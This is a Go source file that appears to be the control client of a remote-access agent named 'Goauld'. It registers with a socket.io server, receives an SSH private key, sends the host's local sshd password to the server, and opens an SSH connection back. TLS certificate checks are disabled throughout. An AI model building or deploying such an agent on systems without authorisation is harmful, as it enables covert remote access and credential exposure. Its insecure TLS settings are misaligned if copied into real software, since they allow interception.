package control

import (
	"Goauld/agent/agent"
	"Goauld/agent/ssh"
	"Goauld/common/crypto"
	socketio "Goauld/common/socket.io"
	"context"
	"crypto/tls"
	"fmt"
	sio "github.com/karagenc/socket.io-go"
	eio "github.com/karagenc/socket.io-go/engine.io"
	"github.com/quic-go/webtransport-go"
	"net/http"
	"nhooyr.io/websocket"
)

func NewClient(ctx context.Context) error {
	cfg := getEioConfig()

	manager := sio.NewManager(agent.Get().SocketIoUrl(), cfg)
	socket := manager.Socket("/", nil)

	socket.OnConnect(func() {
		fmt.Println("Connected")
	})
	manager.OnError(func(err error) {
		fmt.Printf("Error: %v\n", err)
	})
	manager.OnReconnect(func(attempt uint32) {
		fmt.Printf("Reconnected. Number of attempts so far: %d\n\n", attempt)
	})
	socket.OnConnectError(func(err any) {
		fmt.Printf("Connect error: %v\n\n", err)
	})

	socket.OnEvent(socketio.SendSshPrivateKeyEvent, func(data []byte) {
		fmt.Println("start" + socketio.SendSshPrivateKeyEvent)
		privateKey, err := socketio.DecryptSshPrivateKeyMessage(data, agent.Get().Cryptor)
		if err != nil {
			fmt.Printf("Error decrypting private key: %v\n", err)
		}
		agent.Get().SShPrivateKey = privateKey.SshPrivateKey
		fmt.Printf("Ssh private key received: %s\n", agent.Get().SShPrivateKey)
		fmt.Println("sending local sshd password")
		localSshPassword, err := socketio.NewEncryptedAgentSshPasswordMessage(agent.Get().LocalSShdPassword(), agent.Get().Cryptor)
		if err != nil {
			fmt.Printf("Error encrypting local sshd password: %v\n", err)
		}
		socket.Emit(socketio.SendAgentSshPasswordEvent, localSshPassword)
		fmt.Println("connecting to remote ssh server")
		ssh.Connect()
		fmt.Println("end" + socketio.SendSshPrivateKeyEvent)

	})

	socket.OnEvent(socketio.SendSshHPrivateKeyError, func() {
		fmt.Println("OnEvent socketio.SendSshHPrivateKeyError!")
	})

	socket.OnEvent(socketio.SendSshPrivateKeySuccess, func() {
		fmt.Println("OnEvent socketio.SendSshPrivateKeySuccess!")
	})

	encryptedKey, err := crypto.AsymEncrypt(agent.Get().AgePubKey, agent.Get().SharedSecret)
	if err != nil {
		return fmt.Errorf("error encrypting shared secret: %v", err)
	}

	encryptedName, err := crypto.AsymEncrypt(agent.Get().AgePubKey, agent.Get().Name())
	if err != nil {
		return fmt.Errorf("error encrypting shared secret: %v", err)
	}

	// This will be emitted after the socket is connected.
	socket.Emit(socketio.RegisterEvent, socketio.Register{
		Id:        agent.Get().Id,
		SharedKey: encryptedKey,
		Name:      encryptedName,
	})

	socket.Connect()
	fmt.Println("connecting")
	select {
	case <-ctx.Done():
		socket.Emit(socketio.Disconnect, socketio.DisconnectMessage{})
		socket.Disconnect()
	}
	return nil
}

func getEioConfig() *sio.ManagerConfig {
	return &sio.ManagerConfig{
		EIO: eio.ClientConfig{
			UpgradeDone: func(transportName string) {
				fmt.Printf("Client transport is upgrade done\n")
			},
			HTTPTransport: &http.Transport{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true, // DO NOT USE in production. This is for self-signed TLS certificate to work.
				},
			},
			WebSocketDialOptions: &websocket.DialOptions{
				HTTPClient: &http.Client{
					Transport: &http.Transport{
						TLSClientConfig: &tls.Config{
							InsecureSkipVerify: true, // DO NOT USE in production. This is for self-signed TLS certificate to work.
						},
					},
				},
			},
			WebTransportDialer: &webtransport.Dialer{
				TLSClientConfig: &tls.Config{
					InsecureSkipVerify: true, // DO NOT USE in production. This is for self-signed TLS certificate to work.
				},
			},
		},
	}
}
